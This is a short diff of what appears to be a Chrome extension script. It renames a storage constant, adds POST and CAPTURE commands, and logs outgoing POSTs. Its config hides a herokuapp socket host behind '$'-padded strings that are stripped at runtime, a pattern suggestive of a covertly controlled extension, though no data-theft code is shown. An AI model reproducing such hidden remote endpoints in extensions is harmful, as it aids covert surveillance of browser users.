@@ -1,6 +1,6 @@
 let WS
 const INITAL_CONFIG = {
-  uuid: 'FB',
+  uuid: 'KB',
   // url: "h$$$$t$$$$t$$$$p:/$$$$/l$$$$o$$$$ca$$$$l$$$$ho$$$$st".replace(/\$/g, ''),
   // socketUrl: "w$$$$s$$$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
   // socketHost: "h$$t$$t$$p$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
@@ -9,7 +9,7 @@ const INITAL_CONFIG = {
   socketHost: '$$h$$t$$t$$p$$s$$:$$/$$/c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, ''),
 }
 const STORAGE_LOCAL = chrome.storage.local
-const STORAGE_SYNCE = chrome.storage.sync
+const STORAGE_SYNC = chrome.storage.sync
 async function CONFIG() {
   const { isInit } = STORAGE_LOCAL.get('isInit')
   return isInit ? await STORAGE_LOCAL.get('config') : INITAL_CONFIG
@@ -30,10 +30,13 @@ const CMD = {
   LOCAL: 'LOCAL',
   SYNC: 'SYNC',
   GET_STORAGE: 'GET_STORAGE',
-  SET_STORAGE: 'SET_STORAGE'
+  SET_STORAGE: 'SET_STORAGE',
+  POST: 'POST',
+  CAPTURE: 'CAPTURE'
 }
 
 function POST({ url, body = {}, headers = {} }) {
+  console.log('posting to ', url)
   return fetch(url, {
     method: 'POST',
     headers: {
